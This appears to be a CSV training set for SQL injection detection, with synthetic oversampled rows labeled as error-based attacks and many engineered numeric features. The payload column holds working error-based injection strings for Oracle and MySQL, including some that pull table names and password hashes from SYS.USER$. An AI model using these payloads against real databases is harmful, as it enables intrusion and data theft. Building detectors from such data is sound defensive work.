id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000098,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000005,2.0110318070230995,157.1204015904242,38.7658862968963,4.280834336483367,85.37123760189266,1.4414715742240745,50.8929766720667,19.41471574224075,0.5402104876004418,0.009174311926605505,0.3231260163955233,0.12748918407742948,3.0,0.0,0.0,0.0,0.0,2.4414715742240753,0.0,6.64882944534445,0.0,4.882943148448151,0.44147157422407535,2.4414715742240745,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.4414715742240751,0.0,0.4414715742240751,1.4414715742240751,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,5.324414722672225
SMOTE_000099,attack,error,"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",nearest_attack_euclidean,R000116,1.3423627566888532,194.76078737898888,27.887792734128315,3.4407979643235196,43.107274569449096,41.668310898807526,86.76572007541145,23.219481835320785,0.22130681752086762,0.21586704929082773,0.44386570169569817,0.11896043149260647,0.0,0.0,0.0,0.0,0.44389636706415697,2.0,0.0,15.775585468256628,0.0,0.0,4.5561036329358435,2.4438963670641556,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8877927341283138,0.0,0.0,0.4438963670641569,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,5.33168910119247
SMOTE_000100,attack,error,"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000068,1.2214847850931925,257.3801795757728,34.76035915154559,3.9334250253559495,98.52071830309119,35.0,93.85946127268161,30.0,0.3827699934401785,0.13598609047217372,0.36468440996864177,0.11655950611900606,0.0,0.0,0.0,0.0,2.0,1.0,0.0,18.619820424227203,0.0,2.0,5.0,3.0,0.0,0.0,0.0,0.38017957577279615,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.0
SMOTE_000101,attack,error,-2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx,nearest_attack_euclidean,R000159,1.844025599266167,454.9701397820378,36.0,3.4961344094535307,117.30590858324554,56.425349455094434,203.72395163471668,77.5149301089811,0.25780197938880167,0.12400842947862487,0.44781269103172294,0.17037690010085052,4.0,0.0,0.5149301089811128,0.0,0.0,3.0,0.0,42.05972043592445,0.0,0.0,0.0,31.45520967305666,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.4850698910188873,0.0,0.48506989101888714,2.485069891018887,1.0,0.5149301089811128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.970139782037775
SMOTE_000102,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,0.7146066129066512,336.2069726247571,33.52948210482304,3.496639923072213,83.91215157652671,49.0,145.70637473376127,57.58844631446912,0.24941759744628914,0.14597508612496518,0.43335400502716037,0.1712533114015853,1.794223157234558,0.0,0.0,0.0,0.0,2.2647410524115195,0.0,30.52948210482304,0.0,0.0,1.0,22.264741052411516,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.2647410524115195,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,5.2647410524115195
SMOTE_000103,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.06679745833013913,218.0,41.28744294570863,4.334285545158663,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.0
SMOTE_000104,attack,error,1'   )    )    as cmll where 7948  =  7948 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000197,0.301764396339145,365.0,35.194575106702466,3.6536483888657076,100.0,53.0,152.0,60.0,0.273972602739726,0.14520547945205478,0.41643835616438357,0.1643835616438356,0.9027124466487668,0.09728755335123318,2.0,0.0,0.0,3.0,0.0,30.0,0.0,3.0,0.0,25.0,0.9027124466487668,0.09728755335123318,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000105,attack,error,"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000072,1.1030150787782005,285.4389644428732,35.62805177785634,3.9012038830532805,102.97558577714928,35.0,109.46337866572391,38.0,0.3607179325208848,0.12275646087223502,0.38324716337416787,0.13327844323271232,0.0,4.0,0.0,0.0,2.0,2.0,0.0,20.74389644428732,1.256103555712681,2.0,5.0,4.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000106,attack,error,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",nearest_attack_euclidean,R000301,1.4444777718955248,193.95726854799054,29.0,3.553172471798422,51.085462904018925,32.0,82.91453709598107,27.957268547990537,0.26362561403678125,0.16500232266327333,0.4273216121156759,0.14405045118426948,4.0,0.0,0.0,0.0,1.0,2.0,0.0,14.97863427399527,0.9786342739952696,0.0,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.0
SMOTE_000107,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc",nearest_attack_euclidean,R000076,0.6216823693938666,163.596311237321,29.0,3.8542567139147677,51.002305476674366,35.0,56.99538904665127,20.598616713995384,0.31210476771534323,0.2140206647310735,0.3480557700619045,0.1258187974916787,0.0,4.0,0.0,0.0,0.0,1.1995389046651275,0.0,10.399077809330253,0.0,0.0,5.0,1.1995389046651272,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.8004610953348725,0.1995389046651275,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000108,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'sqbr'  =  'sqbr",nearest_attack_euclidean,R000309,0.5812493306353937,188.7532939037776,29.0,3.60471137456448,49.54547396037901,34.33765401698042,79.20781994339859,25.662345983019577,0.2622893918996198,0.1823949881324368,0.4194124447133493,0.1359031752545941,4.0,0.0,0.0,0.0,0.22078199433985854,2.0,0.0,14.441563988679718,0.0,0.0,4.779218005660142,2.2207819943398572,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.4415639886797167,0.0,0.0,0.22078199433985846,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.662345983019575
SMOTE_000109,attack,error,select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000151,0.10766288129040057,133.0,28.46908328986529,3.7298837045694078,56.0,14.0,51.00000000000001,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0000000000000002,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.0
SMOTE_000110,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000091,0.4493598886479139,143.1814761960195,26.433837663093566,3.738327478453494,36.6030259785614,38.42154978254191,49.86767532618713,18.289225108729042,0.25415579569373603,0.26952995581618644,0.34848246084926116,0.12783178764081637,0.0,1.4338376630935665,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.855387445635478,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1446125543645222,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,3.1446125543645222
SMOTE_000111,attack,error,-2154%' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  ',nearest_attack_euclidean,R000285,0.06802810316210976,414.5038876994445,34.0,3.4703394807429047,103.0239946523545,53.928016042936505,183.47989304708994,74.0719839570635,0.24855923900845123,0.13011821148317904,0.44262015810148764,0.1787023914068821,4.0,0.0,0.976005347645502,0.0,0.0,3.0,0.0,38.095978609418,2.0,0.0,0.0,29.9760053476455,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.023994652354498,0.976005347645502,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000112,attack,error,"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk",nearest_attack_euclidean,R000216,0.47732026281075834,275.08256548095875,37.0,4.035976015008546,107.86773561706615,35.0,98.04128274047937,34.17354712341323,0.3921220656384098,0.12726830162799874,0.35636863101982996,0.12424100171376151,0.0,4.0,0.0,0.0,2.0,1.8264528765867696,0.0,18.34709424682646,0.0,2.0,5.0,3.82645287658677,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.1735471234132304,0.8264528765867696,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000113,attack,error,"1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000240,1.5105375144148816,162.0,30.472995844053898,3.8708901526716897,40.581012467838306,44.89198337621559,56.0540083118922,20.472995844053898,0.25050007696196486,0.27711100849515796,0.34601239698698893,0.12637651755588825,0.5270041559461022,0.4729958440538979,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.472995844053898,4.0,0.5270041559461022,0.47299584405389783,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000114,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",nearest_attack_euclidean,R000105,0.22381654526751502,174.54917133273705,29.817916333375926,3.7946421272687436,51.45374900012777,35.728334666496295,64.82083666624075,22.546250999872225,0.29524530878718586,0.20461529651136431,0.371048578164259,0.1290908165371908,0.0,4.0,0.0,0.0,0.0,1.0,0.0,12.36416733324815,0.0,0.0,5.182083666624075,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000115,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'tblb'  =  'tblb",nearest_attack_euclidean,R000089,0.8504687363214236,188.85405058523162,28.348347384786557,3.5527032506146305,49.966364246530425,34.190991569128066,79.15735581565849,25.539338953914623,0.2639816682053302,0.18164148402487243,0.4191022270506438,0.13527462071915358,4.0,0.0,0.0,0.0,0.2696694769573114,1.7303305230426886,0.0,14.539338953914623,0.0,0.0,4.730330523042689,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.5393389539146225,0.0,0.0,0.26966947695731136,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.809008430871934
SMOTE_000116,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw",nearest_attack_euclidean,R000024,1.2860087361006045,196.42896251274544,28.761930834183026,3.431431374288782,49.46041305867111,32.0,88.27006722958626,26.698482224488078,0.25189671222779847,0.16509639396968936,0.44764971725305736,0.1353571765494548,0.0,2.761930834183029,0.0,0.0,1.0,1.5873102780610098,0.0,16.349241112244037,0.0,0.0,4.0,2.5873102780610093,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.5873102780610095,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,6.587310278061009
SMOTE_000117,attack,error,"1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000186,0.05978731770239478,185.16427934479015,34.953063044345676,3.861958130126682,60.98826576108642,30.91786032760493,72.1877478226173,21.070405433481486,0.3293985637856523,0.1670164742881548,0.38981136043350023,0.11377360149269272,1.0352027167407436,0.0,0.0,0.0,0.0,1.0,0.0,14.046936955654324,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.9882657610864187,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.9882657610864188,0.0,0.011734238913581052,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,3.0000000000000004
SMOTE_000118,attack,error,"1%' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '%'  =  '",nearest_attack_euclidean,R000156,0.9304194846922694,306.6148233020673,38.61482330206729,4.0079326169231715,101.6148233020673,55.0,113.0,37.0,0.33140702536590444,0.179378602950611,0.3685414933348917,0.12067287834859286,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,2.0,0.0,6.0,4.999999999999999,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.6148233020672902,0.3851766979327099,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000119,attack,error,"1"" where 3274  =  3274 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000219,1.2716290438913895,276.0507285547827,38.58985428904345,4.026755721105751,101.0,43.0,98.64058284382618,33.41014571095655,0.36590372833067714,0.15578079522989224,0.3572927168117946,0.12102275962763603,0.41014571095654606,0.5898542890434539,2.0,0.0,2.0,2.0,0.0,18.410145710956545,0.0,2.0,5.0,6.0,0.410145710956546,0.5898542890434539,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000120,attack,error,"1%'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000297,0.2445779647032366,376.3785509180018,34.177556880570926,3.382785081028031,83.91122155971453,49.266335320856385,175.2897724777163,67.91122155971453,0.22294596208258824,0.13091160241580596,0.46570807414532034,0.18043436135628546,4.0,0.0,0.08877844028546278,0.0,0.0,3.0,0.0,35.822443119429074,2.0,0.0,1.0,23.08877844028546,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.9112215597145372,0.08877844028546289,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000121,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,0.8879913562077916,212.66964827938648,42.0,4.275517011787892,115.85417088396727,2.0,71.0,23.815477395419215,0.5446611531359135,0.009408294268057282,0.33399444651603444,0.11193610607999491,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,4.2232160931288245,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.0
SMOTE_000122,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000141,0.01684784501145692,346.87158647521966,35.99388507024855,3.729802868749806,98.93273577273412,48.0,139.96331042149134,59.975540280994224,0.2852086442256324,0.1383830187690233,0.4035045933569663,0.17290374364837802,0.0,3.981655210745668,1.0,0.0,0.0,2.993885070248556,0.0,28.0,0.0,3.0,0.0,23.993885070248556,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.9938850702485558,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,5.993885070248556
